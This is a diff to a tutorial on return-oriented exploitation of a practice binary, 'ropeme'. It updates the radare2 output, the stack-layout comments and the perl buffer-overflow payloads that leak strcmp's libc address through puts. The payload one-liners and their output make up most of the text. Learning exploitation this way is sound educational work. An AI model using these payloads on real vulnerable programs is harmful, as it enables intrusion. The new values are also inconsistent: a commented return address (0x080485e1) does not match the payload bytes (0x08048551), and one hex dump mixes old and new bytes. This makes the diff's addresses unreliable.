@@ -454,17 +454,17 @@ jump we just have to ask radare2:
 ::
 
     $ rabin2 -s ropeme | grep strcmp
-    vaddr=0x08048350 paddr=0x00000350 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp
+    vaddr=0x08048370 paddr=0x00000370 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp
 
-So the strcmp address in the PLT is 0x08048310. Where does it jump after that?
+So the strcmp address in the PLT is 0x08048370. Where does it jump after that?
 
 ::
 
-    $ r2 -q -d -c 'dc;pd 1 @ 0x08048350' rarun2 program=ropeme arg1=admin42
+    $ r2 -q -d -c 'dc;pd 1 @ 0x08048370' rarun2 program=ropeme arg1=admin42
         ...
-    0x08048350    ff2530990408   jmp qword [rip + 0x8049930]   ; [0x10091c86:8]=-1
+    0x08048370    ff25a0990408   jmp qword [rip + 0x80499a0]   ; [0x10091d16:8]=-1
 
-We now know that the jump in the GOT is done at the address 0x8049930 for
+We now know that the jump in the GOT is done at the address 0x80499a0 for
 strcmp. At this address will be dynamically decided the address of the strcmp
 function in the dynamically loaded libc. We can print it using our puts
 payload from exercise 5:
@@ -473,24 +473,24 @@ payload from exercise 5:
 
     # Stack wanted:
     #
-    # ^ [strcmp GOT  address] = 0x08049930
-    # | [puts return address] = 0x0804857d
-    # | [puts        address] = 0x08048380
+    # ^ [strcmp GOT  address] = 0x080499a0
+    # | [puts return address] = 0x080485e1
+    # | [puts        address] = 0x080483a0
     # | [padding to overflow] = "A" x 92
 
-    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' | ./ropeme admin42
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' | ./ropeme admin42
     Enter password: Wrong password
-    ��c�PB]�
+    �tc�P�i�
     Segmentation fault (core dumped)
 
-    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' | ./ropeme admin42
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' | ./ropeme admin42
     Enter password: Wrong password
-    ��g�PBa�
+    �V�P�\�
     Segmentation fault (core dumped)
 
-    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' | ./ropeme admin42
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' | ./ropeme admin42
     Enter password: Wrong password
-    ��k�PBe�
+    �\�P�b�
     Segmentation fault (core dumped)
 
 The first 4 bytes of the oddly displayed line are our address. As you can see
@@ -499,23 +499,23 @@ more clearly:
 
 ::
 
-    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' |\
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x51\x85\x04\x08\xa0\x99\x04\x08"' |\
       strace -e write ./ropeme admin42
-    [ Process PID=26818 runs in 32 bit mode. ]
+    [ Process PID=7721 runs in 32 bit mode. ]
     write(1, "Enter password:\n", 16Enter password:
     )       = 16
     write(1, "Wrong password\n", 15Wrong password
     )        = 15
-    write(1, "\260Pn\367P\362g\367\n", 9�Pn�P�g�
-    )   = 9
-    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
-    +++ killed by SIGSEGV (core dumped) +++
+    write(1, "\300$^\367PBd\367\n", 9�$^�PBd�
+    )      = 9
+    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x9} ---
+    +++ killed by SIGSEGV +++
     Segmentation fault
 
-    $ printf "\260Pn\367" | xxd
-    0000000: b050 6ef7                                .Pn.
+    $ printf '\300$^\367' | xxd
+    0000000: c024 5ef7                                .$^.
 
-So our address is 0xf76e50b0 in that instance.
+So our address is 0xf75e24c0 in that instance.
 
 The reason I used strace is because if we try piping ropeme's output to
 another program (xxd for example in order to get directly an hexadecimal
@@ -533,16 +533,16 @@ file structure that we don't have... Meh, let's just call it in place:
 
     # Stack wanted:
     #
-    # ^ [strcmp GOT  address] = 0x08049930
-    # | [flushing    address] = 0x080484fc
-    # | [puts        address] = 0x08048380
+    # ^ [strcmp GOT  address] = 0x080499a0
+    # | [flushing    address] = 0x0804852c
+    # | [puts        address] = 0x080483a0
     # | [padding to overflow] = "A" x 92
 
-    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\xfc\x84\x04\x08\x30\x99\x04\x08"' |\
+    $ perl -e 'print "A"x92 . "\xa0\x83\x04\x08\x2c\x85\x04\x08\xa0\x99\x04\x08"' |\
       ./ropeme admin42 | xxd
-    00000000: 456e 7465 7220 7061 7373 776f 7264 3a0a  Enter password:.
-    00000010: 5772 6f6e 6720 7061 7373 776f 7264 0ab0  Wrong password..
-    00000020: 7064 f750 125e f70a                      pd.P.^..
+    0000000: 456e 7465 7220 7061 7373 776f 7264 3a0a  Enter password:.
+    0000010: 5772 6f6e 6720 7061 7373 776f 7264 0ab0  Wrong password..
+    0000020: f465 f750 126c f70a                      .e.P.l..
     Segmentation fault (core dumped)
 
 There we are.
